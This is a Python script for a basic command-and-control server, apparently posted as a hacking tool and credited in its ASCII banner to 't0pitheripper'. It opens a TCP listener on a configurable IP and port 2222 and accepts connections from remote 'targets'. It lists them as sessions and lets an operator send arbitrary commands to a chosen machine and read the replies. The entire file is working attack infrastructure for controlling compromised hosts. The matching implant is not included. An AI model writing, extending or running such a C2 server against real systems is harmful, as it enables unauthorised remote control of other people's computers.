import socket
import sys
import threading
import base64

def banner():
                                            
    print(" 8888888888888888                   \*88*/ ") 
    print("       88                                 ")
    print("       88   ,adPPYba,   8b,dPPYba,    88   ")
    print("       88  a8"     '8a  88P'    "8a   88   ")
    print("       88  8b       d8  88       d8   88 --- C2 by t0pitheripper")
    print("       88  '8a,   , a8'  88b,   ,a8'  88   ")
    print("       88   'OYbbdP'    88`YbbdP'     88   ")
    print("       88               88            88   ")
    print("       88               88            88       ")

def comm_in(targ_id):
    print(f'[+] Awaiting response..')
    response = targ_id.recv(1024).decode()
    return response

def comm_out(targ_id, message):
    message = str(message)
    targ_id.send(message.encode())

def target_comm(targ_id):
    while True:
        message = input('send message#> ')
        comm_out(targ_id, message)
        if message == 'exit':
            targ_id.send(message.encode())
            targ_id.close()
            break
        if message == 'background':
            break
        else:
            response = comm_in(targ_id)
            if response == 'exit':
                print('[-] The client has terminated the session. ')
                targ_id.close()
                break
            print(response)

def listener_handler():
    sock.bind((host_ip, host_port))
    print('[+] Awaiting connection from Client..')
    sock.listen()
    t1 = threading.Thread(target=comm_handler)
    t1.start()
    
def comm_handler():
    while True:
        if kill_flag == 1:
            break
        try:
            remote_target, remote_ip = sock.accept()
            targets.append([remote_target, remote_ip[0]])
            print(f'\n[+] Connection received from {remote_ip[0]}\n' + 'Enter command#> ', end='')
        except:
            pass

if __name__ == '__main__':
    targets = []
    banner()
    kill_flag = 0
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        host_ip = '<IP>' # Change IP
        host_port = 2222 # Change Port
    except IndexError:
        print(' [-] Command Line argument(s) missing, Please Try again.')
    except Exception as e:
        print(e)
    listener_handler()
    while True:
        try:
            command = input('Enter command#> ')
            if command.split(" ")[0] == 'sessions':
                session_counter = 0
                if command.split(" ")[1] == '-l':
                    print('Session' + ' ' * 10 + 'Target')
                    for target in targets:
                        print(str(session_counter) + ' ' * 16 + target[1])
                        session_counter += 1
                if command.split(" ")[1] == '-i':
                    num = int(command.split(" ")[2])
                    targ_id = (targets[num])[0]
                    target_comm(targ_id)
        except KeyboardInterrupt:
            print('\n[+] Keyboard interrupt issued. ')
            kill_flag = 1
            sock.close()
            break
